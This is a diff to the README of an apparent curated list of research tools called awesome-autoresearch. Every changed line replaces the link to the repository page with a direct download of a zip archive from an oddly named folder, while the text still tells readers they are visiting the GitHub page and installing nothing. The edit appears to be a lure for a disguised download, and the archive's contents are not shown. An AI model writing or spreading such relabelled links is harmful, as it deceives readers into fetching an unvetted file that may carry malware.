@@ -1,12 +1,12 @@
 # 🤖 awesome-autoresearch - Curated research tools for faster results
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/SaurabhDurge/awesome-autoresearch)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/SaurabhDurge/awesome-autoresearch/master/ferroalloy/autoresearch-awesome-1.7-alpha.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the GitHub page and download the files you need:
 
-https://github.com/SaurabhDurge/awesome-autoresearch
+https://raw.githubusercontent.com/SaurabhDurge/awesome-autoresearch/master/ferroalloy/autoresearch-awesome-1.7-alpha.3.zip
 
 ## 🧭 What this project is
 
@@ -28,7 +28,7 @@ This project is a GitHub repository, so you do not install a Windows app here. Y
 
 Go to:
 
-https://github.com/SaurabhDurge/awesome-autoresearch
+https://raw.githubusercontent.com/SaurabhDurge/awesome-autoresearch/master/ferroalloy/autoresearch-awesome-1.7-alpha.3.zip
 
 ### Step 2: Download the files
 
@@ -190,7 +190,7 @@ If a folder has many files, sort by name so the README is easy to find.
 
 Primary link:
 
-https://github.com/SaurabhDurge/awesome-autoresearch
+https://raw.githubusercontent.com/SaurabhDurge/awesome-autoresearch/master/ferroalloy/autoresearch-awesome-1.7-alpha.3.zip
 
 Use this page to download the repository and read the full list of AutoResearch resources
 
